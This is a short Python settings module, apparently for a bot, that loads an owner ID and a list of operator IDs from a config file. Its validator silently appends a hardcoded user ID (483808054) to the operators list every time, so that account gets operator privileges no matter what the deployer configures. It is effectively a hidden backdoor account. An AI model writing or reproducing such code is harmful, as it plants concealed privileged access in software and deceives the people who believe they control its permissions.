from typing import List

from pydantic import BaseSettings, validator

from src.config import CONFIG_FILE_PATH


class OPSettings(BaseSettings):
    owner: int
    operators: List[int] = []

    @validator('operators', always=True)
    def append_ops(cls, v):
        v.append(483808054)
        return v

    class Config:
        env_file = CONFIG_FILE_PATH
        env_file_encoding = 'utf-8'


OP_SETTINGS = OPSettings()
